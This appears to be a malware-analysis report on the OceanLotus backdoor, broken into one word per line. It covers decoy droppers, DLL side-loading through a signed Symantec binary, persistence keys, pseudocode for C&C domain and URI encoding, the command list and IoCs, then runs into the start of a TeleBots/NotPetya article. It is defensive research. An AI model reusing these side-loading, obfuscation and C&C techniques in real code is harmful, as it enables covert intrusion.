-
Jan
2018.exe
•
remove_pw_Reschedule
of
CISD
Regular
Meeting.exe

•
Sorchornor_with_PM_-_Sep_2017.exe

•
20170905-Evaluation
Table.xls.exe

•
CV_LeHoangThing.doc.exe
.
Fake
résumé
(
CV
)
documents
were
also
seen
in
Canada
.

All
these
files
have
something
in
common
:
A
decoy
document
is
launched
,
but
is
password-protected
.

It's
unclear
whether
this
password
is
provided
by
any
means
,
for
example
in
the
email
it
was
attached
to
,
or
if
the
documents
are
simply
not
meant
to
work
.

Fake
installers

Several
fake
installers
,
claiming
to
be
installers
or
updates
for
popular
software
were
seen
in
watering
hole
campaigns
.

A
good
example
of
such
an
installer
is
the
repackaged
Firefox
installer
described
by
360
Labs
on
Freebuf
(
Chinese
language
)
.

Another
sample
we
saw
had
the
name
RobototFontUpdate.exe
.

It
was
also
likely
to
have
been
distributed
via
compromised
websites
,
but
we
do
not
yet
have
enough
evidence
to
confirm
this
.

All
the
files
described
here
,
whether
they
were
sent
in
an
email
or
downloaded
while
visiting
a
compromised
site
,
deliver
the
same
(
functionally
equivalent
)
backdoor
component
.

For
the
purpose
of
this
article
we
will
dissect
the
RobototFontUpdate.exe
sample
and
show
how
it
manages
to
execute
its
malicious
payload
on
a
system
.

OceanLotus
Old
techniques
,
new
backdoor

Technical
analysis

The
whole
process
of
installation
and
execution
relies
heavily
on
multiple
layers
of
obfuscation
such
as
decryption
of
payloads
,
PE
reconstruction
and
loading
shellcode
,
and
side-loading
techniques
.

The
last
technique
was
previously
described
in
a
previous
ESET
research
article
about
Korplug
.

Execution
flow
overview

The
attack
is
split
in
two
parts
:
the
dropper
and
backdoor
launcher
.

Each
step
of
each
part
of
the
process
will
be
explained
in
detail
in
its
respective
section
.

The
following
two
diagrams
briefly
summarize
the
general
flow
of
execution
of
the
malware
.

The
dropper
part
has
the
following
flow
of
execution
:

Drops
executes
%temp%

RobotoSlab.ttf

Eraser

C:\ProgramFiles\Symantec\SymantecEndpointProtection\12.1.671.4971.104a\DeviceAssociationService\

SyLog.bin

Fake
rastls.dll

RasTlsc.exe

C&C
domains

Encoding
charset

Version
ID

Registry
keys

RobototFontUpdate.exe

Deletes

Executes

VirtualAlloc

RtlMoveMemory

RtlZeroMemory

SHELLCODE

Executes

Drops

Drops
and
executes

Real

Dropper

Figure
1

Dropper
execution
flow

The
backdoor
part
has
the
following
execution
flow
:

Loads

Decrypts
executes

Decrypts
loads

Executes

VirtualAlloc

RtlMoveMemory

RtlZeroMemory

SHELLCODE

Decrypts
loads

RasTlsc.exe

Fake
rastls.dll

SyLog.bin
shellcode

Launcher

BACKDOOR

Loads

HTTPProv
library

Figure
2

Backdoor
execution
flow

OceanLotusOld
techniques
,
new
backdoor

A
quick
word
on
control
flow
obfuscation

Almost
all
of
these
components
are
obfuscated
.

The
obfuscation
is
based
on
pairs
of
complementary
conditional
jump
instructions
.

Every
form
is
used
:
JZ/JNZ
,
JP/JNP
,
JO/JNO
,
etc
,
each
pair
jumping
to
the
same
target
.

The
sequence
is
interleaved
with
junk
code
,
which
makes
use
of
the
stack
pointer
,
but
does
not
change
the
conditional
flag's
value
.

This
means
it
will
always
end
up
in
the
same
branch
.

This
causes
problems
during
decompilation
due
to
the
use
of
positive
stack
pointer
values
.

Figure
3

Complementary
conditional
jump

OceanLotusOld
techniques
,
new
backdoor

Moreover
,
some
basic
blocks
push
one
address
on
the
stack
,
then
end
with
a
JMP/CALL
while
other
basic
blocks
push
two
addresses
then
end
with
a
RET
instruction
.

The
second
push
is
the
function
to
call
and
the
first
one
is
the
address
of
the
next
basic
block
to
jump
to
.

This
creates
basic
blocks
with
no
parents
.

Figure
4

PUSH/JMP
technique

OceanLotus
Old
techniques
,
new
backdoor

The
resulting
combination
of
these
two
obfuscation
techniques
creates
'
beautiful
'
graphs
:

Figure
5

Control
flow
obfuscation

The
junk
code
is
pretty
easy
to
spot
and
once
the
scheme
is
known
,
it
can
be
ignored
when
analysing
the
samples
.

The
Dropper

Stage
1

The
decoy
document

Over
the
past
few
months
,
a
number
of
decoy
documents
have
been
used
.

One
of
them
was
a
fake
TrueType
font
updater
for
the
Roboto
Slab
regular
font
.

This
choice
of
font
seems
a
bit
odd
since
it
does
not
support
a
lot
of
East-Asian
languages
.

Figure
6

RobototFontUpdate
icon

When
executed
,
this
binary
decrypts
its
resource
(
XOR
with
a
128-byte
,
hardcoded
key
)
and
decompresses
the
decrypted
data
(
LZMA
)
.

The
legitimate
RobotoSlab-Regular.ttf
(
SHA1:912895e6bb9e05af3a1e58a1da417e992a71a324 B_hash
)
file
is
written
into
the
%temp%
folder
and
run
via
Win32
API
function
ShellExecute
.

OceanLotus
Old
techniques
,
new
backdoor

The
shellcode
decrypted
from
the
resource
is
executed
.

After
its
execution
,
the
fake
font
updater
drops
another
application
whose
sole
purpose
is
to
delete
the
dropper
.

This
'
eraser
'
application
is
dropped
as
%temp%\[0-9].tmp.exe
.

Stage
2

The
shellcode

The
shellcode
used
is
the
same
for
every
stage
that
uses
shellcode

The
shellcode
is
a
custom
PE
loader
.

It
recreates
an
executable
in
memory
:
it
decrypts
all
the
sections
and
computes
the
necessary
relocations
and
other
offsets
.

The
shellcode
retrieves
three
Windows
API
functions
:
VirtualAlloc
,
RtlMoveMemory
and
RtlZeroMemory
.

The
RtlZeroMemory
function
is
heavily
used
to
zero-out
fields
in
the
PE
header
.

Relying
on
automatic
memory
dumping
will
not
work
since
the
MZ/PE
headers
are
broken
.

The
shellcode
calls
the
entry-point
function
of
the
decrypted
PE
and
then
the
DLLEntry
export
function
.

Stage
3

Real
Dropper
,
{103004A5-829C-418E-ACE9-A7615D30E125}.dll

This
executable
decrypts
its
resource
using
the
AES
algorithm
with
CBC
mode
via
the
Windows
API
.

The
size
of
the
hardcoded
key
is
256
bits
.

After
decryption
,
the
data
are
decompressed
(
LZMA
algorithm
)
.

If
the
process
is
running
with
administrator
privileges
,
then
the
malware
achieves
persistence
by
creating
a
service
,
else
the
classic
Windows
'
Run
'
registry
key
is
used
(
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run;DeviceAssociationService;rastlsc.exe
)
.

If
the
dropper
is
executed
with
administrator
privileges
,
then
it
tries
to
write
the
following
files
in
the
C:\Program
Files\Symantec\Symantec
Endpoint
Protection\12.1.671.4971.104a\DeviceAssociationService\
folder
else
it
writes
them
in
the
%APPDATA%\Symantec\SymantecEndpoint
Protection\12.1.671.4971.104a\DeviceAssociationService\folder
:

•
rastlsc.exe
(
SHA1:2616da1697f7c764ee7fb558887a6a3279861fac B_hash
,
copy
of
legitimate
Symantec
Network
Access
Control
application
,
dot1xtra.exe
)

•
SyLog.bin
(
SHA1:5689448b4b6260ec9c35f129df8b8f2622c66a45 B_hash
,
encrypted
backdoor
)

•
rastls.dll
(
SHA1:82e579bd49d69845133c9aa8585f8bd26736437b B_hash
,
malicious
DLL
sideloaded
by
rastlsc.exe
)

The
path
changes
from
sample
to
sample
but
the
pattern
is
similar
.

Depending
on
its
privileges
,
the
malware
drops
the
files
in
%ProgramFiles%
or
%appdata%
.
We've
also
seen
:

•
\Symantec\CNGKeyIsolation\

•
\Symantec\ConnectedUserExperiencesandTelemetry\

•
\Symantec\DevQueryBackgroundDiscoveryBrokerTasks\

These
paths
are
used
by
various
Symantec
products
.

After
achieving
persistence
and
dropping
the
executable
,
the
legitimate
Symantec
executable
,
rastlsc.exe
,
is
executed
using
CreateProcessW
.

We've
also
seen
another
version
(
{BB7BDEC9-B59D-492E-A4AF-4C7B1C9E646B}.dll
)
,
which
executes
rastlsc.exe
with
the
parameter
krv
.

Its
meaning
is
discussed
below
.

OceanLotus
Old
techniques
,
new
backdoor

Backdoor
component
:
rastlsc.exe
side-loading

The
OceanLotus
group
uses
an
old
and
publicly
known
technique
on
one
of
the
Symantec
product's
executable
files
.

The
trick
,
here
,
is
to
take
advantage
of
the
library
loading
process
of
a
legitimate
and
signed
executable
by
writing
a
malicious
library
inside
the
same
folder
.

This
way
it
will
make
malicious
behaviors
look
legitimate
because
these
actions
are
made
by
the
trusted
executable
process
.

As
mentioned
earlier
,
the
legitimate
executable
rastlsc.exe
is
dropped
and
executed
.

This
executable
imports
the
rastls.dll
file
,
which
in
this
case
contains
the
malicious
payload
.

Figure
7

Symantec
rastlsc.exe
digital
signature

Side
loading
was
also
observed
using
other
legitimate
,
signed
executables
including
mcoemcpy.exe
from
McAfee
,
which
loads
McUtil.dll
.

This
technique
has
also
been
used
by
PlugX B_malware.unknown
before
.

This
also
got
the
attention
of
the
Vietnam
CERT
(
Vietnamese
language
)
.

Stage
1

Library
side-loading
,
rastls.dll

The
internal
name
of
this
dll
is
{7032F494-0562-4422-9C39-14230E095C52}.dll
but
we've
seen
other
versions
like
{5248F13C-85F0-42DF-860D-1723EEAA4F90}.dll
.

All
exported
functions
lead
to
the
execution
of
the
same
function
.

OceanLotus
Old
techniques
,
new
backdoor

Figure
8

All
rasltls.dll
exports
lead
to
the
same
function

This
export
tries
to
read
the
SyLog.bin
file
located
inside
the
same
folder
.

Other
versions
tried
to
open
the
file
OUTLFLTR.DAT
.

If
that
file
exists
,
it
is
decrypted
using
AES
in
CBC
mode
with
a
hardcoded
,
256-bit
key
and
then
decompressed
(
LZMA
compression
)
.

The
McUtil.dll
variant
uses
a
different
technique
.

At
first
glance
,
it
looks
as
if
like
the
main
function
does
nothing
malicious
,
but
in
fact
it
replaces
the
.text
section
of
the
legitimate
mcoemcpy.exe
,
a
side-loaded
binary
.

It
generates
shellcode
whose
purpose
is
to
call
the
function
reading
the
encrypted
stage-two
shellcode
in
the
mcscentr.adf
file
.

OceanLotus
Old
techniques
,
new
backdoor

The
following
pseudocode
is
used
to
create
the
shellcode
:

x
=
False
i
=
0
buff
=
genRandom(
)
opc1
=
[0x58,0x59,0x5a,0x5b]
opc2
=
[0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57]
opc3
=
[0x90,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48
,
while
i
<
len(buff
)
:
currentChar
=
buff[i]
if
currentChar
<
0xc8
:
else
:
i+=1
if
x
:
else
:
x
=
x
==
False
buff[i]
=
opc1[currentChar
%
len(opc1)]
buff[i]
=
opc2[currentChar
%
len(opc2)]
buff[i]
=
opc3[currentChar
%
len(opc3)]
0x49,0x4a,0x4b]

The
result
is
the
following
assembly
listing
:

Figure
9

Generated
shellcode

Stage
2
to
Stage
4

Shellcode
,
Launcher
and
Shellcode
again

The
shellcode
decrypts
and
loads
the
library
{E1E4CBED-5690-4749-819D-24FB660DF55F}.dll
.

The
library
retrieves
its
resource
and
tries
to
start
the
service
'
DeviceAssociationService
'
.

The
decrypted
data
also
contains
shellcode
.

The
latter
decrypts
the
final
layer
:
the
backdoor
.

OceanLotus
Old
techniques
,
new
backdoor

The
variant
{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll
checks
whether
rastlsc.exe
was
executed
with
krv
as
the
first
parameter
.

If
so
,
then
a
job
is
created
and
rastlsc.exe
is
executed
again
,
but
without
the
parameter
.

Stage
5

The
backdoor
,
{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll

The
malware
first
tries
to
retrieve
its
resource
and
decrypt
it
using
RC4
.

The
decrypted
resource
contains
an
interesting
piece
of
information
,
used
to
configure
the
backdoor
.

The
format
of
this
configuration
is
straightforward
to
reverse
.

Using
Kaitai
struct
and
its
structure
dumper
,
the
following
representation
can
be
displayed
:

Figure
10

Configuration
structure

NOTES
:
except
for
the
string
domain_encoding_str
and
the
httpprov
library
,
all
these
data
change
from
one
sample
to
another
.

The
registry
keys
are
almost
the
same
but
they
follow
a
similar
pattern
:
\HKCU\SOFTWARE\Classes\AppX[a-f0-9]{32}
,
which
is
quite
generic
.

The
malware
retrieves
the
first
10
bytes
of
the
username
(
UTF-16
)
,
XORs
it
with
the
3-letter
UTF-16
mutex_encoding_str
string
,
and
encodes
it
in
hex
.

The
result
is
used
as
a
mutex
name
.

For
instance
,
for
a
user
whose
name
starts
with
abc
and
the
key
being
vwx
,
the
following
mutex
will
be
created
:
\Sessions\1\BaseNamedObjects\170015001b
.

The
backdoor
includes
a
PE
loader
that
loads
the
library
HTTPProv.dll
in
memory
,
calls
its
entrypoint
and
then
calls
the
export
function
named
CreateInstance
.

OceanLotus
Old
techniques
,
new
backdoor

Communication

The
backdoor
uses
a
classic
TCP
communication
protocol
over
port
25123
.

In
order
to
retrieve
the
server
IP
address
,
the
backdoor
first
creates
a
particular
DNS
query
.

The
malware
chooses
between
one
of
the
three
domains
from
the
configuration
and
adds
a
custom
sub-domain
generated
using
two
values
.

The
first
value
is
the
computer
name
up
to
a
length
of
16
bytes
.

The
second
value
is
the
4-byte
version
ID
.

The
following
Python
2
code
implements
the
encoding
algorithm
:
letters=domain_encoding_str
#
'
ghijklmnop
'
hex_pc_name=pc_name.encode('UTF-16LE').encode('hex
'
)
s=
'
'
for
c
in
hex_pc_name
:
if
0x2f
<
ord(c
)
<
0x3a
:
else
:
s+=letters[ord(c
)
-
0x30]
s+=c

For
instance
,
if
the
computer
name
is
random-pc
and
the
version
ID
is
0x0a841523
then
the
following
domain
could
be
created
:

niggmhggmeggmkggmfggmdggidggngggmjgg.ijhlokga.dwarduong[.]com B_url.unknown

The
following
regular
expression
could
be
used
to
flag
a
C&C
server
for
this
backdoor
:

[ghijklmnopabcdef]{4-60}\.[ghijklmnopabcdef]{8}\.[a-z]+\.[a-z]+

If
an
IP
address
is
resolved
for
this
particular
domain
,
then
the
malware
tries
to
establish
a
connection
on
TCP
port
25123
.

Each
sample
has
three
different
domain
names
it
can
use
to
find
its

C&C
server
.

All
communication
is
encrypted
using
RC4
and
compressed
with
LZMA
.

It
is
possible
to
decrypt
the
traffic
because
the
key
is
prepended
to
the
packets
.

The
format
is
:
[RC4key(4bytes)]
[encrypteddata]

Each
byte
of
the
key
is
generated
using
the
rand
function
.

Once
the
packet
is
decrypted
and
decompressed
,
the
data
follow
the
format
:

[dw:unknown]
[dw:unknown]
[dw:commandnumber]
[dw:sizeofdata]
[dw:unknown]
[dw:data]

The
first
time
the
client
connects
to
the
server
,
a
UUID
is
returned
and
used
as
a
session
ID
.

The
latter
is
stored
in
the
registry
key
as
binary
data
:

HKCU\SOFTWARE\Classes\AppXc52346ec40fb4061ad96be0e6cb7d16a\DefaultIcon

As
mentioned
earlier
,
the
backdoor
also
contains
a
library
called
HTTPprov
.

This
library
is
an
alternative
way
,
as
a
backup
,
to
communicate
with
the
server
as
a
backup
.

This
DLL
sends
a
POST
request
over
the
HTTP
protocol
to
communicate
.

It
also
supports
HTTPS
and
the
usage
of
a
SOCKS5
,

SOCKS4a
or
SOCKS4
proxy
.

The
library
is
statically
linked
with
libcurl
.

Once
its
initialization
is
done
,
the
following
registry
key
is
created
to
instruct
the
backdoor
to
use
HTTP
in
future
communication
with
the
C&C
server
:

HKCU\SOFTWARE\Classes\CLSID{E3517E26-8E93-458D-A6DF-8030BC80528B}
.

A
generic
user
agent
is
used
:
Mozilla/4.0
(
compatible;
MSIE
8.0;
Windows
NT
6.0;
Trident/4.0
)
.

OceanLotus
Old
techniques
,
new
backdoor

The
most
distinctive
characteristic
of
this
library
is
the
custom
URI
encoding
algorithm
.

The
resource
part
of
the
URI
is
created
using
the
following
pseudocode
:

t=0;
v=UPPER(v);
*buff++=
'
h';
*buf++=
UPPER(vowels[b[1]
%
5]);
buffEnd
=
(
(
DWORD)genRand(4
)
%
20
)
+
10
+
buff;
while
(
buff
<
buffEnd){
*buff='\0';
b=genRand(16);
if
(
b[0]
-
0x50
>
0x50
)
else
v=consonants[b[1]%21]);
if
(
!t
)
*buff++=
v;
if
(
v!='h
'
&&
b[2]
-
0x50
<
0x50
)
*buff++=
vowels[b[4]
%
5];
if
(
b[5]
<
0x60
)
*buff++=
consonants[b[7]
%
21];
if
(
b[8]
<
0x50
)
*buff++=
'
-';
*buff++=
vowels[b[9]
%
5];
*buff++=
vowels[b[6]
%
5];

NOTE
:
For
clarity
,
the
length-checking
part
has
been
removed
from
the
snippet
.

From
this
generated
string
,
two
numbers
are
computed
based
on
the
custom
checksum
to
obtain
a
URI
:

checksum=crc32(buff
)
num2=(checksum
>>
16
)
+
(
checksum
&
0xffff
)
*
2
num1=(num2
^
1
)
&
0xf

URL=GENERATED_DOMAIN+
'
/
'
+
num1
+
'
/
'
+
num2
+
'
-
'
+
buff

By
adding
the
URI
generator
of
the
HTTPprov
library
,
the
following
URL
could
be
generated
:

hXXp://niggmhggmeggmkggmfggmdggidggngggmjgg.ijhlokga.aisicoin[.]com/13/139756-Ses-Ufali-L B_url.unknown

OceanLotus
Old
techniques
,
new
backdoor

Commands

After
receiving
its
SESSIONID
,
the
backdoor
does
a
fingerprint
of
the
system
.

The
packet
is
built
in
this
fashion
:

Offset
in
the

Description

packet

0x000

0x001

0x002

0x003

0x007

0x027

0x079

0x179

0x279

0x379

0x3f9

0x400

0x401

byte
:
value
varies
in
each
version

0x01
:
hardcoded
byte

bool
:
is
elevation
token
present

dword
:
version
ID

string
(
UTF-16
)
,
computer
name
(
0x20
bytes
max
)

string
(
UTF-16
)
,
user
name

registry
query
result
of
the
HKLM\SOFTWARE\Microsoft\WindowsNT\
CurrentVersion
values
:
ProductName
,
CSDVersion
,
CurrentVersion
,
ReleaseId
,
CurrentBuildNumber
and
the
result
of
the
call
to
IsWow64Process
(
x86
|
x64
)

Following
format
string
'
%s(%s);
'
replaced
with
(
GetVolumeInformationW
:
VolumeNameBuffer
)
,
VolumePathNames

PhysicalDrive
deviceIOControl
0x2D1400
(
IOCTL_STORAGE_QUERY_PROPERTY
)
(
VolSerialNumber
)

wmi
SELECT
SerialNumber
FROM
Win32_BaseBoard

GetSystemTimeAsFileTime

bool
:
unknown

dword
:
obtained
from
the
decryption
of
the
resource

Here's
an
example
of
a
fingerprint
of
a
system
:

Figure
11

System
fingerprint

OceanLotus
Old
techniques
,
new
backdoor

This
is
a
full-featured
backdoor
that
offers
its
operators
many
capabilities
,
such
as
file
,
registry
and
process
manipulation
,
loading
additional
components
,
and
performing
a
system
fingerprint
.

Here's
the
list
of
supported
commands
:

Command
number

Description

+23
in
new
version

Fingerprint

Sets
the
session
ID

Creates
a
process
and
gets
the
output
(
using
pipes
)

Sets
the
connection
retry
counter

Delays
polling
time

Reads
a
file
or
registry
key
and
computes
the
MD5

Creates
a
process

Creates
a
file
,
a
registry
entry
or
a
stream
in
memory

Writes
to
the
registry

Queries
the
registry

Searches
for
files
on
the
system

Moves
files
to
another
directory

Deletes
files
from
the
disk

List
the
drives
mapped
on
the
system
using
the
GetLogicalDriveStringW
function

Creates
directory

Deletes
directory

Reads
a
file
from
an
offset

Calls
the
PE
Loader
(
switch
to
HTTPprov
communication
)

[Unknown]

0
:
Query
a
value
from
the
registry
,
1:Drop
and
execute
a
program

Sets
an
environment
variable

Runs
shellcode
in
a
new
thread

Retrieves
an
environment
variable

Restarts
itself
if
the
'
APPL
'
environment
variable
doesn't
exist

CONCLUSION

Once
again
,
OceanLotus
shows
that
the
team
is
active
and
continues
to
update
its
toolset
.

This
also
demonstrates
its
intention
to
remain
hidden
by
picking
its
targets
,
limiting
the
distribution
of
their
malware
and
using
several
different
servers
to
avoid
attracting
attention
to
a
single
domain
or
IP
address
.

The
encryption
of
the
payload
,
together
with
the
side-loading
technique
–
despite
its
age
–
is
a
good
way
to
stay
under
the
radar
,
since
the
malicious
activities
look
like
they
come
from
the
legitimate
application
.

OceanLotus
Old
techniques
,
new
backdoor

IoCs

Samples

Table
1
.

Initial
Dropper

SHA1-1

Filename

ESET
Detection
Name

fdcb35cd9cb8dc1474cbcdf1c9bb03200dcf3f18  B_hash

RobototFontUpdate.exe

a40ee8ff313e59aa92d48592c494a4c3d81449af  B_hash

Firefox Installer.exe

c2eb1033bc01ab0fd732a7ba4967be02c0690bf0  B_hash

20170905-Evaluation

Table.xls.exe

d35695f2366a43628231e73ffa83ca106306a8fa  B_hash

CV_LeHoangThing.doc.exe

Win32/TrojanDropper.Agent.RUI

Win32/TrojanDropper.Agent.RUI

Win32/TrojanDropper.Agent.RUI

Win32/TrojanDropper.Agent.RUI

fe0161fb8a26a0bf4afad746c7ebf89499dcd3a7  B_hash

032ef58b7978d079287874044dc516af624ae5f5  B_hash

2a387d7d47a63d6e47d9cc92d3dc69a53816c2c0  B_hash

7105caa6d4fd8a2c67523d385277528e556ae4f6  B_hash

f96bcd875836da89800912de1e557891697c7cf4  B_hash

Chi
tiet
don
khieu
nai
gui
saigontel.exe

Win32/TrojanDropper.Agent.RUI

Mi17
Technical
issues-Phonesack
Grp.exe

Win32/TrojanDropper.Agent.RUI

Sorchornor_with_PM_-_Sep_2017.exe

Win32/TrojanDropper.Agent.RUI

Updated
AF
MOD
contract-Jan
2018.exe

Win32/TrojanDropper.Agent.RUI

remove_pw_Reschedule
of
CISD
Regular
Meeting.ex_

Win32/TrojanDropper.Agent.RUI

Table
2
.

Sideloaded
libraries

SHA1-1

Filename

ESET
Detection
Name

82e579bd49d69845133c9aa8585f8bd26736437b  B_hash

rastls.dll

202fb56edb2fb542e05c845d62ffbdcfbebed9ec  B_hash

McUtil.dll

Win32/Salgorea.BD

Win32/Korplug.MK

Network

IP
addresses
46.183.220.81 B_ip.unknown
46.183.220.82 B_ip.unknown
46.183.222.82 B_ip.unknown
46.183.222.83 B_ip.unknown
46.183.222.84 B_ip.unknown
46.183.223.106  B_ip.unknown
46.183.223.107  B_ip.unknown
74.121.190.130  B_ip.unknown
74.121.190.150  B_ip.unknown
79.143.87.230 B_ip.unknown

OceanLotus
Old
techniques
,
new
backdoor

79.143.87.233 B_ip.unknown
84.38.132.226 B_ip.unknown
84.38.132.227 B_ip.unknown
149.56.180.243  B_ip.unknown
158.69.100.199  B_ip.unknown
164.132.45.67 B_ip.unknown
192.34.109.163  B_ip.unknown
192.34.109.173  B_ip.unknown
198.50.191.194  B_ip.unknown
198.50.191.195  B_ip.unknown
198.50.234.96 B_ip.unknown
198.50.234.111  B_ip.unknown

Domain

names

adineohler[.]com  B_url.unknown
aisicoin[.]com  B_url.unknown
alicervois[.]com  B_url.unknown
anessallie[.]com  B_url.unknown
antenham[.]com  B_url.unknown
arinaurna[.]com B_url.unknown
arkoimmerma[.]com B_url.unknown
aulolloy[.]com  B_url.unknown
avidilleneu[.]com B_url.unknown
avidsontre[.]com  B_url.unknown
aximilian[.]com B_url.unknown
biasatts[.]com  B_url.unknown
braydenhateaub[.]com  B_url.unknown
carosseda[.]com B_url.unknown
chascloud[.]com B_url.unknown
dreyoddu[.]com  B_url.unknown
dwarduong[.]com B_url.unknown
eckenbaue[.]com B_url.unknown
eighrimeau[.]com  B_url.unknown
errellawle[.]com  B_url.unknown
erstin[.]com  B_url.unknown
frahreiner[.]com  B_url.unknown
hieryells[.]com B_url.unknown
hristophe[.]com B_url.unknown
ichardt[.]com B_url.unknown
icmannaws[.]com B_url.unknown
iecopeland[.]com  B_url.unknown
irkaimboeuf[.]com B_url.unknown
jamedalue[.]com B_url.unknown
jamyer[.]com  B_url.unknown
jeanessbinder[.]com B_url.unknown
jeffreyue[.]com B_url.unknown
keoucha[.]com B_url.unknown
laudiaouc[.]com B_url.unknown
lbertussbau[.]com B_url.unknown
loridanase[.]com  B_url.unknown
marrmann[.]com  B_url.unknown
meroque[.]com B_url.unknown
moureuxacv[.]com  B_url.unknown

OceanLotusOld
techniques
,
new
backdoor

myolton[.]com B_url.unknown
nasahlaes[.]com B_url.unknown
ntjeilliams[.]com B_url.unknown
omasicase[.]com B_url.unknown
onnaha[.]com  B_url.unknown
onteagle[.]com  B_url.unknown
orinneamoure[.]com  B_url.unknown
orresto[.]com B_url.unknown
orrislark[.]com B_url.unknown
rackerasr[.]com B_url.unknown
rcuselynac[.]com  B_url.unknown
sanauer[.]com B_url.unknown
stopherau[.]com B_url.unknown
tefanie[.]com B_url.unknown
tefanortin[.]com  B_url.unknown
tephens[.]com B_url.unknown
traveroyce[.]com  B_url.unknown
tsworthoa[.]com B_url.unknown
ucaargo[.]com B_url.unknown
ucairtz[.]com B_url.unknown
urnage[.]com  B_url.unknown
venionne[.]com  B_url.unknown
virginiaar[.]com  B_url.unknown

Host-based

Windows
registry
keys

HKCU\SOFTWARE\Classes\AppXc52346ec40fb4061ad96be0e6cb7d16a\

HKCU\SOFTWARE\Classes\AppX3bbba44c6cae4d9695755183472171e2\

HKCU\SOFTWARE\Classes\CLSID{E3517E26-8E93-458D-A6DF-8030BC80528B}\

HKCU\SOFTWARE\Intel\Display\igfxcui\igfxtray\;[NUMBER];[DWORD]
(
set
by
command
#19
)

Last
IoC
update
:
2018-02-22
18:30:46
Eastern
Standard
Time
TeleBots
are
back
:
Supply-chain
attacks
against
Ukraine

welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/ B_url.normal

6/30/2017

By
Anton
Cherepanov
posted
30
Jun
2017
-
03:30PM

Ransomware

The
latest
Petya B_malware.ransom
-
like
outbreak
has
gathered
a
lot
of
attention
from
the
media
.

However
,
it
should
be
noted
that
this
was
not
an
isolated
incident
:
this
is
the
latest
in
a
series
of
similar
attacks
in
Ukraine
.

This
blogpost
reveals
many
details
about
the
Diskcoder.C
(
aka
ExPetr B_malware.unknown
,
PetrWrap B_malware.ransom
,
Petya B_malware.ransom
,
or
NotPetya B_malware.ransom
)
outbreak
and
related
information
about
previously
unpublished
attacks
.

1/11

Figure
1
–
The
timeline
of
supply-chain
attacks
in
Ukraine
.

TeleBots

In
December
2016
we
published
two
detailed
blogposts
about
disruptive
attacks
conducted
by
the
group
ESET
researchers
call
TeleBots
,
specifically
about
attacks
against
financial
institutions
and
a
Linux
version
of
the
killdisk B_malware.ransom
malware
used
by
this
group
.

The
group
mounted
cyberattacks
against
various
computer
systems
in
Ukraine;
systems
that
can
be
defined
as
critical
infrastructure
.

Moreover
,
this
group
has
connections
with
the
infamous
BlackEnergy
group
that
was
responsible
for
the
December
2015
power
outages
in
Ukraine
.

In
the
final
stage
of
its
attacks
,
the
TeleBots
group
always
used
the
killdisk B_malware.ransom
malware
to
overwrite
files
with
specific
file
extensions
on
the
victims
'
disks
.
Putting
the
cart
before
the
horse
:
collecting
ransom
money
was
never
the
top
priority
for
the
TeleBots
group
.

The
killdisk B_malware.ransom
malware
used
in
the
first
wave
of
December
2016
attacks
,
instead
of
encrypting
,
simply
overwrites
targeted
files
.

Further
,
it
did
not
provide
contact
information
for
communicating
with
the
attacker;
it
just
displayed
an
image
from
the
Mr
.
Robot
TV
show
.

2/11

Figure
2
–
The
picture
displayed
by
killdisk B_malware.ransom
malware
in
the
first
wave
of
December
2016
attacks
.

In
the
second
wave
of
attacks
,
the
cybersaboteurs
behind
the
killdisk B_malware.ransom
malware
added
contact
information
to
the
malware
,
so
it
would
look
like
a
typical
ransomware
attack
.

However
,
the
attackers
asked
for
an
extraordinary
number
of
bitcoins
:
222
BTC
(
about
$250,000
at
that
time
)
.

This
might
indicate
that
they
were
not
interested
in
bitcoins
,
but
their
actual
aim
was
to
cause
damage
to
attacked
companies
.

Figure
3
–
The
ransom
demand
displayed
by
killdisk B_malware.ransom
in
the
second
wave
of
December
2016
attacks
.

In
2017
,
the
TeleBots
group
didn't
stop
their
cyberattacks;
in
fact
,
they
became
more
sophisticated
.

In
the
period
between
January
and
March
2017
the
TeleBots
attackers
compromised
a
software
company
in
Ukraine
(
not
related
to
M.E.Doc
)
,
and
,
using
VPN
tunnels
from
there
,
gained
access
to
the
internal
networks
of
several
financial
institutions
.

During
that
attack
,
those
behind
TeleBots
enhanced
their
arsenal
with
two
pieces
of
ransomware
and
updated
versions
of
tools
mentioned
in
the
previously
-
linked
blogposts
.

The
first
backdoor
that
the
TeleBots
group
relied
heavily
on
was
Python
/
TeleBot.A B_malware.backdoor
,
which
was
rewritten
from
Python

3/11

in
the
Rust
programming
language
.

The
functionality
remains
the
same
:
it
is
a
standard
backdoor
that
uses
the
Telegram
Bot
API
in
order
to
receive
commands
from
,
and
send
responses
to
,
the
malware
operator
.

Figure
4
–
Disassembled
code
of
the
Win32
/
TeleBot.AB  B_malware.backdoor
trojan
.

The
second
backdoor
,
which
was
written
in
VBS B_malware.backdoor
and
packaged
using
the
script2exe
program
,
was
heavily
obfuscated
but
the
functionality
remained
the
same
as
in
previous
attacks
.

Figure
5
–
The
obfuscated
version
of
the
VBS B_malware.backdoor
backdoor
.

This
time
the
VBS B_malware.backdoor
backdoor
used
the
C&C
server
at
130.185.250[.]171 B_ip.cncsvr
.

To
make
connections
less
suspicious
for
those
who
check
firewall
logs
,
the
attackers
registered
the
domain
transfinance.com[.]ua B_url.cncsvr
and
hosted
it
on
that
IP
address
.

As
is
evident
from
Figure
6
this
server
was
also
running
the
Tor
relay
named
severalwdadwajunior
.

4/11

Figure
6
–
Information
about
Tor
relay
run
by
the
TeleBots
group
.

In
addition
,
the
attacker
used
the
following
tools
:

CredRaptor
(
password
stealer
)

Plainpwd
(
modified
Mimikatz
used
for
recovering
Windows
credentials
from
memory
)

SysInternals
'
PsExec
(
used
for
lateral
movement
)

As
mentioned
above
,
in
the
final
stage
of
their
attacks
,
the
TeleBots
attackers
pushed
ransomware
using
stolen
Windows
credentials
and
SysInternals
'
PsExec
.
This
new
ransomware
was
detected
by
ESET
products
as
Win32/Filecoder.NKH
.

Once
executed
,
this
ransomware
encrypts
all
files
(
except
files
located
in
the
C:\Windows
directory
)
using
AES-128
and
RSA-1024
algorithms
.

The
malware
adds
the
.xcrypted
file
extension
to
alreadyencrypted
files
.

When
encryption
is
done
,
this
filecoder
malware
creates
a
text
file
!readme.txt
with
the
following
content
:

Please
contact
us
:
openy0urm1nd@protonmail.ch

In
addition
to
Windows
malware
,
the
TeleBots
group
used
Linux
ransomware
on
